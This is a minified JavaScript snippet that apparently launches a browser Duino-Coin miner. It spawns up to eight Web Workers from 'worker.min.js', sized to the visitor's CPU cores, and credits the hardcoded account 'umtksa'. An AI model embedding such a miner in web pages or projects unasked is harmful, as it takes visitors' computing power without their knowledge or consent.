const userThreads=navigator.hardwareConcurrency;let username="umtksa",rigid="Duino-JS",threads=1;function startMiner(){1>threads&&(threads=1),8<threads&&(threads=8),threads>userThreads&&(threads=userThreads);for(let a=0;a<threads;a++)worker=new Worker("worker.min.js"),worker.postMessage([username,rigid])}
